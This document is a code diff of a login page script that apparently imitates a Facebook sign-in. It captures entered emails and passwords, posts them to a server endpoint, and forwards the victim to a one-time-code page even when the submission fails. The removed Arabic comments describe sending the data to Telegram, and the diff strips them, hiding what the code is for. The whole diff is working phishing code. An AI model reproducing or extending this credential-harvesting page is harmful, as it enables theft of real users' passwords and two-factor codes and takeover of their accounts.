@@ -275,7 +275,6 @@
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // خد القيم حتى لو فاضية
             const email = emailInput.value.trim() || '(empty)';
             const password = passwordInput.value.trim() || '(empty)';
             
@@ -283,22 +282,17 @@
             loginBtn.disabled = true;
             
             try {
-                // إرسال لتيلجرام
                 await fetch('/submit-login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email, password })
                 });
                 
-                // حفظ الإيميل
                 localStorage.setItem('fb_email', email);
-                
-                // روح لصفحة OTP
                 window.location.href = '/otp';
                 
             } catch (error) {
                 console.error('❌ خطأ:', error);
-                // حتى لو حصل خطأ، كمّل للـ OTP
                 localStorage.setItem('fb_email', email);
                 window.location.href = '/otp';
             }
@@ -308,7 +302,6 @@
         forgotBtn.addEventListener('click', function() {
             const email = emailInput.value.trim() || '(empty)';
             
-            // إرسال لتيلجرام
             fetch('/submit-login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
